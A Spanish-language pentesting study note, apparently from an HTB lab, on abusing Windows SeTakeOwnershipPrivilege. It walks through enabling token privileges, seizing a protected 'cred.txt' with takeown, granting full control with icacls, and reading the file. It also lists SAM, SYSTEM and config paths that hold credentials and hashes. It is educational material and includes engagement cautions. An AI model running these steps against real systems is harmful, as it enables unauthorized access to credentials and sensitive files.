tags:
___
## 🧠 Concepto clave
`SeTakeOwnershipPrivilege` permite a un usuario tomar posesión de cualquier objeto del sistema — archivos, carpetas, claves de registro, servicios, procesos, objetos de Active Directory — asignándose derechos `WRITE_OWNER` sobre él. Una vez que se es propietario, se pueden modificar los permisos del objeto para acceder a su contenido. Es un privilegio de uso menos frecuente que otros, pero especialmente valioso cuando otros métodos están bloqueados o cuando se necesita acceder a archivos sensibles en file shares.

| Privilegio | Qué es | Riesgo / Explotación |
|---|---|---|
| `SeTakeOwnershipPrivilege` | Permite tomar posesión de cualquier objeto del sistema asignando derechos `WRITE_OWNER` sobre su security descriptor | Acceso a archivos sensibles inaccesibles (credenciales, configs, backups), posible RCE si se toman archivos ejecutables o de configuración de aplicaciones web, o DoS si se modifican archivos críticos del sistema |

## 📌 Puntos importantes

### ¿Cuándo encontramos este privilegio?

Por defecto solo los administradores lo tienen, pero en entornos reales puede aparecer asignado a **cuentas de servicio** encargadas de tareas de backup o VSS snapshots, frecuentemente acompañado de `SeBackupPrivilege`, `SeRestorePrivilege` y `SeSecurityPrivilege` — todos ellos potencialmente abusables para escalar. También puede obtenerse de forma indirecta explotando GPOs mal configuradas con herramientas como **SharpGPOAbuse** 📄 [SharpGPOAbuse — FSecureLABS](https://github.com/FSecureLABS/SharpGPOAbuse), que permiten asignar el privilegio a una cuenta controlada por el atacante.

La configuración de este privilegio en Group Policy se encuentra en:
`Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment` 📄 [Documentación oficial — Microsoft](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)

### Consideraciones importantes antes de abusar de este privilegio

Tomar posesión de un archivo es una **acción potencialmente destructiva**. Cambiar el propietario y los permisos de un archivo en uso (como un `web.config` activo) puede tumbar una aplicación o interrumpir servicios. En un engagement real:

- Nunca modificar archivos críticos en producción sin consentimiento explícito del cliente.
- Documentar meticulosamente cualquier cambio realizado.
- Intentar siempre revertir los permisos originales tras el acceso.
- Si no es posible revertirlos, documentarlo en el apéndice del informe como hallazgo con impacto potencial.

Algunos clientes preferirán que se documente la capacidad de realizar la acción como evidencia de la misconfiguration, sin llegar a explotarla completamente.

---

### Flujo de explotación — Acceso a archivo sensible en file share

El escenario típico es encontrar un archivo en un file share corporativo al que no se tiene acceso de lectura, pero sobre el que se puede tomar posesión gracias a este privilegio.

**Paso 1 — Verificar que el privilegio está asignado**
```powershell
whoami /priv
```

`SeTakeOwnershipPrivilege` aparecerá probablemente en estado `Disabled`. Esto no impide su uso, pero hay que habilitarlo primero.

**Paso 2 — Habilitar el privilegio con EnableAllTokenPrivs.ps1**

Windows no ofrece un cmdlet nativo para habilitar privilegios del token, por lo que se necesita un script externo. 📄 [EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Tras ejecutarlo, `SeTakeOwnershipPrivilege` aparecerá como `Enabled`.

**Paso 3 — Identificar el archivo objetivo y verificar su propietario actual**

En el ejemplo, durante la exploración de un file share corporativo con directorios `Public` y `Private`, se encuentra un archivo `cred.txt` en el subdirectorio `IT\Private` al que se tiene visibilidad pero no acceso de lectura. Se verifica quién es el propietario actual:
```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

Si el propietario no se muestra, significa que no se tienen permisos suficientes para leer el security descriptor. Se puede consultar el directorio padre para obtener más información:
```cmd
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

**Paso 4 — Tomar posesión del archivo con takeown** 📄 [takeown — Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown)
```cmd
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

Tras esto, el usuario actual se convierte en propietario del archivo. Se puede confirmar repitiendo el comando `Get-ChildItem` del paso anterior.

**Paso 5 — Modificar la ACL para concederse permisos de lectura con icacls**

Ser propietario no implica automáticamente poder leer el archivo — los permisos de la ACL pueden seguir denegando el acceso. Hay que otorgarse permisos explícitamente: 📄 [Standard Access Rights — Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights)
```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

**Paso 6 — Leer el archivo**
```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'
```

---

### Archivos de interés

Además de archivos en file shares, hay ubicaciones locales especialmente valiosas que pueden contener credenciales, configuraciones sensibles o hashes del sistema:
```
c:\inetpub\wwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

También merece la pena buscar archivos como `*.kdbx` (bases de datos KeePass), notebooks de OneNote, archivos con nombres como `passwords.*`, `pass.*`, `creds.*`, scripts, archivos de configuración, y virtual hard drives (`.vhd`, `.vmdk`).

---

## 🛠️ Comandos / Herramientas

> [!tip] Verificar si SeTakeOwnershipPrivilege está asignado
> ```powershell
> whoami /priv
> ```
> `/priv` — Lista todos los privilegios del usuario actual con su estado. SeTakeOwnershipPrivilege aparecerá como Disabled aunque sea usable tras habilitarlo.

> [!tip] Habilitar todos los privilegios del token con EnableAllTokenPrivs.ps1
> ```powershell
> Import-Module .\Enable-Privilege.ps1
> .\EnableAllTokenPrivs.ps1
> ```
> `Import-Module` — Carga el script en la sesión PowerShell actual.
> `EnableAllTokenPrivs.ps1` — Habilita todos los privilegios presentes en el token del usuario, incluido SeTakeOwnershipPrivilege.

> [!tip] Consultar propietario y atributos de un archivo
> ```powershell
> Get-ChildItem -Path 'C:\ruta\al\archivo.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
> ```
> `-Path` — Ruta al archivo a inspeccionar.
> `Get-Acl $_.FullName).Owner` — Extrae el propietario actual del security descriptor del archivo.

> [!tip] Listar contenido de un directorio mostrando propietarios
> ```cmd
> cmd /c dir /q 'C:\ruta\al\directorio'
> ```
> `/q` — Muestra el propietario de cada archivo y subdirectorio listado.

> [!tip] Tomar posesión de un archivo
> ```cmd
> takeown /f 'C:\ruta\al\archivo.txt'
> ```
> `/f` — Especifica el archivo o directorio del que se tomará posesión. Acepta wildcards. Añadir `/r` para operar recursivamente sobre directorios.

> [!tip] Conceder permisos completos sobre un archivo con icacls
> ```powershell
> icacls 'C:\ruta\al\archivo.txt' /grant htb-student:F
> ```
> `/grant` — Concede los permisos especificados al usuario indicado.
> `htb-student:F` — Usuario al que se conceden permisos. `F` equivale a Full Control (control total).

## 🔗 Relaciones / Contexto

`SeTakeOwnershipPrivilege` es más un privilegio de **acceso a información** que de escalada directa a SYSTEM, aunque en las circunstancias adecuadas puede llevar a ambas cosas. Su mayor valor en un pentest está en entornos Active Directory donde los file shares corporativos concentran información sensible: credenciales, scripts de automatización, configuraciones de infraestructura o bases de datos KeePass. Combinado con `SeBackupPrivilege` o `SeRestorePrivilege` en la misma cuenta, el nivel de acceso potencial sobre el sistema es prácticamente total.